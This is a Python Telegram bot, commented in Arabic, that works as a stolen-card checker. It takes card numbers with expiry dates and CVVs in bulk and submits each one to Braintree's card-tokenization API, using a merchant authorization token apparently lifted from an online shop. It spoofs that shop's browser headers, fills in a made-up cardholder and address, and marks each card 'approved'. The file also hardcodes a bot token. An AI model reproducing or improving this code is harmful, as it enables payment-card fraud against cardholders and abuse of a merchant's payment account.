
import telebot
import requests
import time

# أدخل التوكن الخاص بالبوت هنا
TOKEN = '7823594166:AAG5HvvfOnliCBVKu9VsnzmCgrQb68m91go'
bot = telebot.TeleBot(TOKEN)

# دالة لمعالجة الأوامر /start و /help
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, "أهلاً! أرسل قائمة البطاقات (كل بطاقة في سطر جديد) لإنهاء الإدخال، أرسل 'انتهاء'.")

# دالة لمعالجة النصوص
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text.lower() == 'انتهاء':
        bot.reply_to(message, "تم إنهاء الإدخال. شكراً!")
        return

    try:
        # افترض أن المستخدم أرسل قائمة البطاقات
        cards = message.text.split('\n')
        for e in cards:
            cc, mm, yy, cvv = e.split('|')
            yy = yy[-2:]

            headers = {
                'authority': 'payments.braintree-api.com',
                'accept': '*/*',
                'accept-language': 'ar-AE,ar;q=0.9,en-VI;q=0.8,en;q=0.7,en-US;q=0.6',
                'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjY2OTM1NzksImp0aSI6IjA2YTdmMGNhLWI1ZmYtNDBiZC05YjlmLTYzNmUwZWExZmY4MCIsInN1YiI6InlweWs1eDltanR5dm52a3IiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWdhdGV3YXkuY29tIiwibWVyY2hhbnQiOnsicHVibGljX2lkIjoieXB5azV4OW1qdHl2bnZrciIsInZlcmlmeV9jYXJkX2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6QVhPIl0sImF1ZCI6WyJncmFuZGJyYXNzLmNvbSJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJncmFuZGJyYXNzbGFtcHBhcnRzbGxjX2luc3RhbnQifX0.hnj0P6Y8yzjC6O3Lp28u9ecN6CIjT_TuPQUFUCQpjbqXru51iWzdYRe5l9LFhT8GHjomXcv6Rv1lK5kaGAGZkg',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://grandbrass.com',
                'referer': 'https://grandbrass.com/',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, مثل Gecko) Chrome/124.0.0.0 Safari/537.36',
            }

            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': 'a7490ed2-7977-4200-98bb-9c1cdf201f40',
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mm,
                            'expirationYear': yy,
                            'cvv': cvv,
                            'cardholderName': 'mokshz',
                            'billingAddress': {
                                'countryCodeAlpha2': 'US',
                                'locality': 'new york',
                                'countryName': 'United States',
                                'postalCode': '10080',
                                'streetAddress': '4641 Colorado Blvd bb',
                            },
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }

            response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
            response.raise_for_status()
            tok = response.json()['data']['tokenizeCreditCard']['token']

            # هنا يمكنك إضافة رمز للتحقق من البطاقة باستخدام tok
            # على سبيل المثال، يمكنك إرسال طلب آخر للتحقق من البطاقة

            # إرسال الرد للمستخدم
            bot.reply_to(message, f'{e} >>> تمت الموافقة ✅')

    except Exception as ex:
        bot.reply_to(message, f'حدث خطأ مع البطاقة {e}: {str(ex)}')

# بدء البوت
bot.polling()
